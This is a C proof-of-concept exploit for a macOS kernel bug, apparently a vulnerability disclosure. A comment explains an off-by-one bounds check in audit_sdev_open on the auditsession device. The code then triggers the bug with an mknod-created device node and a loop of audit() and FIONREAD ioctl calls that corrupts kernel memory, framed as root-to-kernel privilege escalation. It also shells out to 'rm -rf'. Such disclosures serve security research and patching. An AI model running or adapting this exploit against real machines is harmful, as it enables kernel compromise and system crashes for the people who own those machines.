// ianbeer
#if 0
MacOS kernel memory corruption due to off-by-one in audit_sdev_open

The auditsession device has a copy-pasted version of the same bug as the auditpipe device:

  static int
  audit_sdev_open(dev_t dev, __unused int flags,  __unused int devtype, proc_t p)
  {
    struct audit_sdev *asdev;
    struct auditinfo_addr aia;
    int u;

    u = minor(dev);
    if (u < 0 || u > MAX_AUDIT_SDEVS)
      return (ENXIO);

    (void) audit_sdev_get_aia(p, &aia);

    AUDIT_SDEV_LIST_WLOCK();
    asdev = audit_sdev_dtab[u];


Again, that bounds check on the minor number should be >= MAX_AUDIT_SDEVS.

In the auditsession case we again end up with that oob pointer being confused with a counter,
in this case audit_sdev_drops allowing us to aritrarily increment a struct audit_sdev pointer.

This is a root -> kernel privesc as you need to be able to mknod the auditsession device with a controlled
minor number.

tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <net/bpf.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <bsm/audit.h>
#include <security/audit/audit_ioctl.h>

int main(int argc, char** argv) {
  system("rm -rf auditsession");
  system("mknod auditsession c 10 32");

  int fd = open("auditsession", O_RDWR);

  if (fd == -1) {
    perror("failed to open auditsession device\n");
    exit(EXIT_FAILURE);
  }
  printf("opened device\n");

  system("touch a_log_file");
  int auditerr = auditctl("a_log_file");
  if (auditerr == -1) {
    perror("failed to set a new log file\n");
  }

  while(1) {
    char* audit_data = "\x74hello";
    int audit_len = strlen(audit_data)+1;
    audit(audit_data, audit_len);
    uint32_t nread = 0;
    int err = ioctl(fd, FIONREAD, &nread);
    if (err == -1) {
      perror("FIONREAD");
      exit(EXIT_FAILURE);
    }
  }

  return 0;
}